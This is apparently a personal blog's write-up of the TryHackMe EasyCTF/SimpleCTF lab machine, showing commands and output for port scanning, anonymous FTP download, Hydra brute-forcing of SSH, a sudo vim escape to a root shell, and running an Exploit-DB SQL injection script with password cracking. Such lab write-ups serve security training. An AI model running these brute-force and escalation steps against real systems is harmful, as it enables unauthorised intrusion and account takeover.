@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Tzero86@trojanwave/posts/easyctf_writeup/</title>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="all,follow">
+    <meta name="googlebot" content="index,follow,snippet,archive">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/terminal-0.7.1.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/animate-3.7.2.min.css">
+    <link rel="stylesheet" href="https://tzero86bits.tk/hugo-theme-console/css/console.css">
+    
+      <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+      <![endif]-->
+       <meta property="og:title" content="EasyCTF_writeup.sh" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://tzero86bits.tk/posts/easyctf_writeup/" /><meta property="article:published_time" content="2020-08-21T14:37:34-04:00" />
+
+
+
+<meta name="twitter:title" content="EasyCTF_writeup.sh"/>
+<meta name="twitter:description" content="THM - EasyCTF/SimpleCTF Writeup Welcome to my second write-up for a TryHackme machine, in this case we&rsquo;ll be solving EasyCTF or should I say SimpleCTF It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules."/>
+
+</head>
+<body class="terminal">
+    <div class="container">
+        <div class="terminal-nav">
+          <header class="terminal-logo">
+            <div class="logo terminal-prompt">
+              
+              
+              <a href="https://tzero86bits.tk/" class="no-style site-name">Tzero86@trojanwave</a>:~# 
+              <a href='https://tzero86bits.tk/posts'>posts</a>/<a href='https://tzero86bits.tk/posts/easyctf_writeup'>easyctf_writeup</a>/</div></header>
+          <nav class="terminal-menu">
+            <ul vocab="https://schema.org/" typeof="BreadcrumbList">
+                
+                <li><a href="https://tzero86bits.tk/about/" typeof="ListItem">about/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/posts/" typeof="ListItem">posts/</a></li>
+                
+                <li><a href="https://tzero86bits.tk/photos/" typeof="ListItem">photos/</a></li>
+                
+            </ul>
+          </nav>
+        </div>
+    </div>
+
+    <div class="container animated zoomIn fast" >
+        
+<h1>EasyCTF_writeup.sh</h1>
+Aug. 21, 2020
+
+
+<br/><br/>
+<img src="../img/easyCTF_cover.png" alt="Post Cover Gif animation";>
+<br/><br/>
+<h2 id="thm---easyctfsimplectf-writeup">THM - EasyCTF/SimpleCTF Writeup</h2>
+<p>Welcome to my second write-up for a TryHackme machine, in this case we&rsquo;ll be solving <strong>EasyCTF</strong> or should I say <strong>SimpleCTF</strong> It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/easyctf">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
+</ul>
+<blockquote>
+<p>Question #1: How many services are running under port 1000?</p>
+</blockquote>
+<p>First let&rsquo;s fire up a <strong>Nmap</strong> scan to see if we can identify any services, making sure we skip the initial ping <strong>[-Pn]</strong>, scan all ports <strong>[-p-]</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ sudo nmap -A -Pn -p- -T4  10.10.251.248
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> tzero86: 
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-20 20:06 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.251.248
+Host is up <span style="color:#f92672">(</span>0.35s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.13.0.34
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was <span style="color:#ae81ff">2</span>
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-robots.txt: <span style="color:#ae81ff">2</span> disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Crestron XPanel control system    <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, L  inux 3.2 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, HP P2000 G3 NAS device <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span> Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>86%<span style="color:#f92672">)</span>, Infomir MAG-250 set-top box <span style="color:#f92672">(</span>86%<span style="color:#f92672">)</span>      
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.                       
+Network Distance: <span style="color:#ae81ff">4</span> hops                                                        
+Service Info: OS: Unix
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+HOP RTT       ADDRESS
+<span style="color:#ae81ff">1</span>   234.68 ms 10.13.0.1
+<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
+<span style="color:#ae81ff">4</span>   376.88 ms 10.10.251.248
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 540.83 seconds
+</code></pre></div><p>With this scan we now we have two services running (under port 1000):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">21</span> - vsFTPd 3.0.3
+<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> 80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</code></pre></div><p>Our extended scan with <strong>autorecon</strong> was returned SSH on port 2222 as well:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ autorecon 10.10.251.248                                                <span style="color:#ae81ff">1</span> 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning target 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-top-20-udp on 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-quick on 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-full-tcp on 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:10:28<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service detection nmap-quick on 10.10.251.248 finished successfully in <span style="color:#ae81ff">1</span> minute, <span style="color:#ae81ff">1</span> second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ftp on tcp/21 on target 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found http on tcp/80 on target 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ssh on tcp/2222 on target 10.10.251.248
+</code></pre></div><p>And with this scan we can answer the second question.</p>
+<blockquote>
+<p>Question #2: What is running on the higher port?</p>
+</blockquote>
+<p>Let&rsquo;s move on to the next one.</p>
+<blockquote>
+<p>Question #3: What&rsquo;s the CVE you&rsquo;re using against the application?</p>
+</blockquote>
+<p>So we need to look for a vulnerability to exploit. Let&rsquo;s see if we can find anything related to <strong>vsFTPd 3.0.3</strong> or related to <strong>Apache HTTPd 2.4.18</strong>.</p>
+<p>The first thing we know about the FTP service running on port 21 is that it has anonymous access enabled. So let&rsquo;s connect to it and maybe download all the files if there is anything interesting that can aid us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ ftp  10.10.251.248 <span style="color:#ae81ff">21</span>                                            
+Connected to 10.10.251.248.
+<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+Name <span style="color:#f92672">(</span>10.10.251.248:tzero86<span style="color:#f92672">)</span>: anonymous
+<span style="color:#ae81ff">230</span> Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; dir
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> pub
+<span style="color:#ae81ff">226</span> Directory send OK.
+ftp&gt; cd pub
+<span style="color:#ae81ff">250</span> Directory successfully changed.
+ftp&gt; ls
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">166</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> ForMitch.txt
+<span style="color:#ae81ff">226</span> Directory send OK.
+</code></pre></div><p>As we can see there is a potentially interesting file called <strong>ForMitch.txt</strong>, which at the very least already gives us one username to try on the SSH port.</p>
+<p>Let&rsquo;s download the file from the FTP, we can use this command to download all files directly:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF/FTPFiles<span style="color:#f92672">]</span>
+└─$ wget -m --no-passive ftp://anonymous:anonymous@10.10.251.248                         
+--2020-08-20 20:39:42--  ftp://anonymous:*password*@10.10.251.248/
+<span style="color:#f92672">=</span>&gt; ‘10.10.251.248/.listing’
+Connecting to 10.10.251.248:21... connected.
+Logging in as anonymous ... Logged in!
+<span style="color:#f92672">==</span>&gt; SYST ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; PWD ... <span style="color:#66d9ef">done</span>.
+<span style="color:#f92672">==</span>&gt; TYPE I ... <span style="color:#66d9ef">done</span>.  <span style="color:#f92672">==</span>&gt; CWD not needed.
+<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; LIST ... <span style="color:#66d9ef">done</span>.
+10.10.251.248/.listing      <span style="color:#f92672">[</span> &lt;<span style="color:#f92672">=</span>&gt;                           <span style="color:#f92672">]</span>     <span style="color:#ae81ff">180</span>  --.-KB/s    in 0s      
+2020-08-20 20:39:46 <span style="color:#f92672">(</span>33.6 MB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/.listing’ saved <span style="color:#f92672">[</span>180<span style="color:#f92672">]</span>
+--2020-08-20 20:39:46--  ftp://anonymous:*password*@10.10.251.248/pub/
+<span style="color:#f92672">=</span>&gt; ‘10.10.251.248/pub/.listing’
+<span style="color:#f92672">==</span>&gt; CWD <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> /pub ... <span style="color:#66d9ef">done</span>.
+<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; LIST ... <span style="color:#66d9ef">done</span>.
+
+10.10.251.248/pub/.list     <span style="color:#f92672">[</span> &lt;<span style="color:#f92672">=</span>&gt;                           <span style="color:#f92672">]</span>     <span style="color:#ae81ff">189</span>  --.-KB/s    in 0s      
+
+2020-08-20 20:39:48 <span style="color:#f92672">(</span>39.3 MB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/pub/.listing’ saved <span style="color:#f92672">[</span>189<span style="color:#f92672">]</span>
+
+--2020-08-20 20:39:48--  ftp://anonymous:*password*@10.10.251.248/pub/ForMitch.txt
+           <span style="color:#f92672">=</span>&gt; ‘10.10.251.248/pub/ForMitch.txt’
+<span style="color:#f92672">==</span>&gt; CWD not required.
+<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; RETR ForMitch.txt ... <span style="color:#66d9ef">done</span>.
+Length: <span style="color:#ae81ff">166</span>
+
+10.10.251.248/pub/ForMi 100%<span style="color:#f92672">[==============================</span>&gt;<span style="color:#f92672">]</span>     <span style="color:#ae81ff">166</span>  --.-KB/s    in 0s      
+
+2020-08-20 20:39:49 <span style="color:#f92672">(</span><span style="color:#ae81ff">345</span> KB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/pub/ForMitch.txt’ saved <span style="color:#f92672">[</span>166<span style="color:#f92672">]</span>
+
+FINISHED --2020-08-20 20:39:49--
+Total wall clock time: 7.1s
+Downloaded: <span style="color:#ae81ff">3</span> files, <span style="color:#ae81ff">535</span> in 0s <span style="color:#f92672">(</span>1.06 MB/s<span style="color:#f92672">)</span>
+
+</code></pre></div><p>When we open the file we get another bit of information, Mitch seems to have a very bad habit of using weak passwords.</p>
+<pre><code>Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+</code></pre><p>So lets attempt to crack it, shall we? Since we know <strong>mitch</strong> is probably a valid username, let&rsquo;s try to crack the SSH login with <strong>hydra</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ hydra -l mitch -P <span style="color:#e6db74">&#34;/usr/share/seclists/Passwords/Common-Credentials/best110.txt&#34;</span> -e nsr -s <span style="color:#ae81ff">2222</span> -o <span style="color:#e6db74">&#34;/home/kali/Documents/THM/easyCTF/results/10.10.251.248/scans/tcp_2222_ssh_hydra.txt&#34;</span> ssh://10.10.49.87
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-21 13:04:27
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">113</span> login tries <span style="color:#f92672">(</span>l:1/p:113<span style="color:#f92672">)</span>, ~8 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.49.87:2222/
+<span style="color:#f92672">[</span>2222<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.49.87   login: mitch   password: ******
+<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-08-21 13:05:22
+</code></pre></div><p>There we go, we have a user and pass to connect to SSH. With this we can answer the following room questions:</p>
+<blockquote>
+<p>Question #5 What&rsquo;s the password?</p>
+</blockquote>
+<blockquote>
+<p>Question #6 Where can you login with the details obtained?</p>
+</blockquote>
+<p>Let&rsquo;s check the SSH login out:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ ssh mitch@10.10.49.87 -p <span style="color:#ae81ff">2222</span>                                                                                              <span style="color:#ae81ff">255</span> ⨯
+The authenticity of host <span style="color:#e6db74">&#39;[10.10.49.87]:2222 ([10.10.49.87]:2222)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span><span style="color:#f92672">[</span>10.10.49.87<span style="color:#f92672">]</span>:2222<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span><span style="color:#e6db74">mitch@10.10.49.87&#39;</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-58-generic i686<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+<span style="color:#ae81ff">0</span> packages can be updated.
+<span style="color:#ae81ff">0</span> updates are security updates.
+
+Last login: Mon Aug <span style="color:#ae81ff">19</span> 18:13:41 <span style="color:#ae81ff">2019</span> from 192.168.0.190
+$ ls
+user.txt
+$ cat user.txt
+<span style="color:#f92672">{</span>User_flag_value_here<span style="color:#f92672">}</span>
+$ cd ..
+$ ls
+mitch  sunbath
+$ 
+</code></pre></div><p>Let&rsquo;s review where we are at. We managed to get into the FTP server with anonymous login, we download a file for Mitch and got information that he uses bad insecure passwords. We then used Hydra to brute force the password and got the SSH password. We logged into SSH as Mitch and found out the user.txt value. We also know from looking a bit on the SSH, there is another username <strong>sunbath</strong>.</p>
+<p>With this we can answer some questions from the room already. Still no idea what CVE we should be using for Question 2. But we can answer the following:</p>
+<blockquote>
+<p>Question #7: What&rsquo;s the user flag?</p>
+</blockquote>
+<blockquote>
+<p>Question #8: Is there any other user in the home directory? What&rsquo;s its name?</p>
+</blockquote>
+<p>The next question ask us if we can use anything to leverage root privileges, let&rsquo;s check in the current SSH session if our user <strong>mitch</strong> has any access:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -l
+User mitch may run the following commands on Machine:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/vim
+</code></pre></div><p>This let us answer question 9:</p>
+<blockquote>
+<p>Question #9: What can you leverage to spawn a privileged shell?</p>
+</blockquote>
+<p>We now know Mitch can run <strong>vim</strong> as root. Once inside vim we press <strong>ESC</strong> then type in <strong>:!bash</strong> and press enter, just follow my steps and shown below:</p>
+<p><img src="/img/Vim_Exploit_Sudo.gif" alt="Priv Esc with vim running as sudo"></p>
+<p>After that we can just review a bit to see what we find. From the room&rsquo;s question we know we need to locate the root flag. So let&rsquo;s browse to the root folder and see if it is there:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@Machine:/root# ls
+root.txt
+root@Machine:/root# cat root.txt
+<span style="color:#f92672">{</span>The_Root_Flag_Value_here<span style="color:#f92672">}</span>
+root@Machine:/root# 
+</code></pre></div><p>Having found a way to get root access, we can now answer the question 10.</p>
+<blockquote>
+<p>Question #10: What&rsquo;s the root flag?</p>
+</blockquote>
+<p>But we are still missing the CVE number answer to question #3 and also the answer to question #4. It seems we need to find some additional information. These are the questions still pending:</p>
+<blockquote>
+<p>Question #3: What&rsquo;s the CVE you&rsquo;re using against the application?</p>
+</blockquote>
+<blockquote>
+<p>Question #4: To what kind of vulnerability is the application vulnerable?</p>
+</blockquote>
+<p>Maybe we missed something but we surely forgot to run a <strong>gobuster</strong> scan. Let&rsquo;s do that now:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ gobuster dir -u http://10.10.49.87/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.49.87/
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+<span style="color:#f92672">===============================================================</span>
+2020/08/21 14:48:02 Starting gobuster
+<span style="color:#f92672">===============================================================</span>
+/simple <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+
+</code></pre></div><p>This will take some time. Let&rsquo;s see what&rsquo;s that <strong>/simple</strong> directory about.</p>
+<p><img src="https://imgur.com/IjeZ6cvl.png" alt="We get a Simple CMS welcome page"></p>
+<p>So we have a Simple CMS running on the machine and we even get pointed to <strong>/simple/admin/</strong> to log in.</p>
+<p><img src="https://imgur.com/mZDKOlYl.png" alt="We get an admin login panel"></p>
+<p>Let&rsquo;s see if we can find any CVE for this CMS.</p>
+<p>Looking on Exploit-DB we get an SQL injection CVE:</p>
+<p><img src="https://i.imgur.com/evabUPI.png" alt="CVE for this CMS"></p>
+<p>Let&rsquo;s download this python exploit file and see what it does. In this case I renamed the exploit as <strong>exploit.py</strong></p>
+<p>First we need to make this file executable and then we can run our exploit. Also note that this script runs with <strong>python2</strong> and not with <strong>python3</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ python exploit.py --u http://10.10.49.87/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+
+</code></pre></div><p>This script is very unreliable, it crashes a lot. In the end we should see something like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try: 1di
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try: 1do
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Salt <span style="color:#66d9ef">for</span> password found: *************
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: mitch
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: admin@admin.com
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password found: ***********************
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password cracked: ******
+</code></pre></div><p>With that we are able to fully answer all questions for the room and we saw how to get the flags. I believe running <strong>gobuster</strong> right along with <strong>Nmap</strong> was the right way to go. In that case dealing with this script and cracking the password for the CMS would have given us the password for the SSH connection. Anyways, there could be other ways to go about this box. This was mine.</p>
+<p>As usual, happy hacking.</p>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<br>
+<div class="container center" style="margin:10px !important;  text-align: center!important">
+    <div class="center">
+        <script src="https://tryhackme.com/badge/71634"></script>
+    </div>
+    <div class="center">
+        <a href="https://twitter.com/Tzero86" target="_blank" class="fa fa-twitter" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a>
+        <a href="https://github.com/Tzero86" target="_blank" class="fa fa-github" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <a href="https://www.linkedin.com/in/ermedina86/" target="_blank" class="fa fa-linkedin" style="text-decoration: none !important;  font-size: 30px; padding: 5px"></a> 
+        <br> 
+    </div>
+</div>
+
+
+
+        <div class="footer">
+    Made with <a href="https://gohugo.io/">Hugo</a> with
+    <a href="https://github.com/mrmierzejewski/hugo-theme-console/">Console Theme</a>. 
+</div>
+
+    </div>
+  </body>
+</html>
